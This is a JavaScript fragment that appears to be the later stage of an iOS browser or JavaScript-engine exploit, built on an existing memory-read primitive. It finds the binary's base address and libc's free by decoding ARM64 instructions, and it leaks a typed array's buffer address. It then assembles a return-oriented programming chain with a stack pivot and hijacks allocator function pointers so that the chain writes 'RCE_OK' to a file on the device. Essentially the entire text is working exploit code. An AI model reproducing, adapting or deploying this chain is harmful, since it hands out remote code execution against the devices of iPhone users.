/* ===== iOS ROP full: leak Uint8Array data ptr, data in U, pivot mov sp,x0 ===== */
  function u64(x) { return BigInt.asUintN(64, x); }
  function rd32_(A) {
    var a = A & ~7n;
    var q = u64(RD(a));
    var sh = Number(A & 7n) * 8;
    return Number((q >> BigInt(sh)) & 0xffffffffn);
  }
  function put64_(arr, off, val) {
    var v = u64(val);
    for (var i = 0; i < 8; i++) arr[off + i] = Number((v >> BigInt(i * 8)) & 0xffn);
  }
  var base = 0n;
  if (CFG.JS_DEF_FREE) {
    base = u64(js_free - BigInt(CFG.JS_DEF_FREE));
    if ((rd32_(base) >>> 0) !== 0xfeedfacf) base = 0n;
  }
  if (base === 0n) { setres('U_NO_BASE'); return; }
  var libcFree = 0n;
  if (rd32_(js_free) === 0xaa0103e0) {
    var br = rd32_(js_free + 4n);
    if (((br & 0xfc000000) >>> 0) === 0x14000000) {
      var im = br & 0x03ffffff;
      if (im & 0x02000000) im -= 0x04000000;
      var plt = js_free + 4n + BigInt(im) * 4n;
      var ad = rd32_(plt);
      if (((ad & 0x9f000000) >>> 0) === 0x90000000) {
        var ml = (ad >>> 29) & 3, mh = (ad >>> 5) & 0x7ffff;
        var ai = (mh << 2) | ml;
        if (ai & 0x100000) ai -= 0x200000;
        var pg = (plt & ~0xfffn) + BigInt(ai) * 4096n;
        var ld = rd32_(plt + 4n);
        if (((ld & 0xffc00000) >>> 0) === 0xf9400000) {
          var g2 = RD(pg + BigInt((ld >>> 10) & 0xfff) * 8n);
          if (codeok(g2)) libcFree = g2;
        }
      }
    }
  }
  if (libcFree === 0n) { setres('U_NO_FREE'); return; }
  var OPEN = u64(libcFree + 0x296b394cn);
  var WRITE = u64(libcFree + 0x296b3738n);
  var PEXIT = u64(libcFree + 0x4a21a474n);
  var G_CALL = base + 0x3292cn;
  var G_LOAD = base + 0x172d96cn;
  var G_X0 = base + 0x628a2cn;
  var PIVOT2 = u64(libcFree - 0x66cccfcn);

  /* ---- leak: data pointer of a fresh Uint8Array(2048) ---- */
  var MAG = 0x1122334455667788n;
  var UB = new Uint8Array(2048);
  for (var i0 = 0; i0 < 2048; i0++) UB[i0] = 0;
  put64_(UB, 0x400, MAG);
  var U = 0n, lim = 0x10000n, off;
  for (off = D; off < D + lim; off += 8n) {
    var w = RD(off);
    if ((w & 0xffffffffn) === 2048n) {
      var p = RD(off + 16n);
      var pq = p & 0x00ffffffffffffffn;
      if (pq > 0x10000n && pq < 0x0001000000000000n && (p & 7n) === 0n) {
        try { if (RD(p + 0x400n) === MAG) { U = p; break; } } catch (e) {}
      }
    }
  }
  if (U === 0n) {
    for (off = D - 8n; off > D - lim; off -= 8n) {
      var w2 = RD(off);
      if ((w2 & 0xffffffffn) === 2048n) {
        var p2 = RD(off + 16n);
        var pq2 = p2 & 0x00ffffffffffffffn;
        if (pq2 > 0x10000n && pq2 < 0x0001000000000000n && (p2 & 7n) === 0n) {
          try { if (RD(p2 + 0x400n) === MAG) { U = p2; break; } } catch (e) {}
        }
      }
    }
  }
  if (U === 0n) { setres('U_NF D=' + hex(D)); return; }

  /* ---- data in UB (large block, safe from the JS arena) ---- */
  var PATH = '/private/var/mobile/Containers/Data/Application/00000000-0000-0000-0000-000000000000/Documents/rce.txt';
  var MSG = 'RCE_OK\n';
  function a8(x) { return (x + 7) & ~7; }
  var oPath = 0;
  var oMsg = a8(oPath + PATH.length + 1);
  var oA0 = a8(oMsg + MSG.length + 1);
  var oB0 = oA0 + 0x40;
  var oA1 = oB0 + 0x40;
  var oB1 = oA1 + 0x40;
  var oEnd = oB1 + 0x40;
  for (var z = 0; z < oEnd; z++) UB[z] = 0;
  for (var z2 = 0; z2 < PATH.length; z2++) UB[oPath + z2] = PATH.charCodeAt(z2) & 0xff;
  for (var z3 = 0; z3 < MSG.length; z3++) UB[oMsg + z3] = MSG.charCodeAt(z3) & 0xff;
  UB[oA0 + 0x10] = 0x01; UB[oA0 + 0x11] = 0x06;
  UB[oA0 + 0x18] = 0xa4; UB[oA0 + 0x19] = 0x01;
  put64_(UB, oB0 + 0x28, U + BigInt(oPath));
  put64_(UB, oA1 + 0x10, U + BigInt(oMsg));
  UB[oA1 + 0x18] = MSG.length;

  /* ---- ROP chain in TRIG; SP starts at U? no: TRIG user data (header+8) ---- */
  var T = TRIG;
  if (!T || T.length < 0x300) { setres('U_TRIG'); return; }
  for (var i1 = 0; i1 < 0x300; i1++) T[i1] = 0;
  put64_(T, 0x08, U + BigInt(oB0));
  put64_(T, 0x10, G_LOAD);
  put64_(T, 0x18, U + BigInt(oA0));
  put64_(T, 0xB8, U + BigInt(oB0));
  put64_(T, 0xD0, OPEN);
  put64_(T, 0xE0, G_X0);
  put64_(T, 0xF0, G_LOAD);
  put64_(T, 0xF8, U + BigInt(oA1));
  put64_(T, 0x110, G_CALL);
  put64_(T, 0x1A0, WRITE);
  put64_(T, 0x1C0, G_CALL);
  put64_(T, 0x248, U + BigInt(oB1));
  put64_(T, 0x260, PEXIT);
  put64_(T, 0x270, G_X0);

  setres('U_RDY ' + hex(U));
  var RT_FREE = rt + 16n, RT_USABLE = rt + 32n, RT_SIZE = rt + 48n, RT_OPAQUE = rt + 64n;
  var HUGE = 0xffffffffffffffffn, ZERO = 0n;
  setR(RT_FREE); Rb[0] = G_CALL;
  setR(RT_OPAQUE); Rb[0] = ZERO;
  setR(RT_SIZE); Rb[0] = HUGE;
  setR(RT_USABLE); Rb[0] = PIVOT2;
  T = null;
  try { TRIG = null; } catch (e) { setres('U_EXC'); return; }
  setres('U_AFTER');
